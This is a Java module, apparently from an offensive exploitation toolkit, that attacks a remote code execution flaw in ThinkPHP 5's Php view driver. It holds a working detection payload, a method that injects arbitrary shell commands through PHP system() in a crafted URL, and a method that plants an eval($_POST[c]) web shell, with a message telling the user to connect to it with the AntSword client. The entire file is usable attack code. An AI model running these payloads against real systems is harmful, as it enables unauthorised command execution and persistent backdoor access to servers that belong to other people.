package fun.fireline.exp.php.thinkphp;

import fun.fireline.core.ExploitInterface;
import fun.fireline.tools.HttpTools;
import fun.fireline.tools.Response;
import fun.fireline.tools.Tools;

import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.HashMap;

/**
 * @author yhy
 * @date 2021/8/20 22:23
 * @github https://github.com/yhy0
 */

public class TP5_driver_display_rce implements ExploitInterface {
    private String target = null;
    private boolean isVul = false;
    private HashMap<String, String> headers = new HashMap();


    // 检测漏洞是否存在
    @Override
    public String checkVul(String url) {
        this.target = url;

        String payload = "/index.php?s=index/\\think\\view\\driver\\Php/display&content=%3C?php%20var_dump(md5(2333));?%3E";
        url = url + payload;
        Response response = HttpTools.get(url, this.headers, "UTF-8");

        if(response.getText() != null  && response.getText().contains("4f97319b308ed6bd3f0c195c176bbd77")) {
            this.isVul = true;
            return "[+] 目标存在" + this.getClass().getSimpleName() + "漏洞 \t O(∩_∩)O~";
        } else if (response.getError() != null) {
            return "[-] 检测漏洞" + this.getClass().getSimpleName() + "失败， " + response.getError();
        } else {
            return "[-] 目标不存在" + this.getClass().getSimpleName() + "漏洞";
        }
    }

    // 命令执行
    @Override
    public String exeCmd(String cmd, String encoding) {
        String payload = "/index.php?s=index/\\think\\view\\driver\\Php/display&content=%3C?php%20system(\"" + cmd + "\")?%3E";
        String url = this.target + payload;

        Response response = HttpTools.get(url, this.headers, encoding);
        String results;
        if (response.getError() == null) {
            results = Tools.regReplace(response.getText());
        } else {
            results = response.getError();
        }

        return results;
    }

    // 获取当前的web路径，todo
    @Override
    public String getWebPath() {
        String result = exeCmd("@print(realpath(__ROOT__))", "UTF-8");
        return result;
    }

    @Override
    public String uploadFile(String fileContent, String fileName, String platform) throws Exception {
        String results = "";

        String payload = "/index.php?s=index/\\think\\view\\driver\\Php/display&content=${@print(eval($_POST[c]))}";
        Response response = HttpTools.post(this.target + payload, "c=phpinfo();", this.headers,"UTF-8");

        if (response.getError() == null && response.getText().contains("PHP Version")) {
            results = "[+] 执行成功，请使用蚁剑连接即可, 密码为c ：" + this.target + payload;
        } else {
            results = "[-] 上传失败: " + response.getError();
        }
        
        return results;
    }

    @Override
    public boolean isVul() {
        return this.isVul;
    }
}
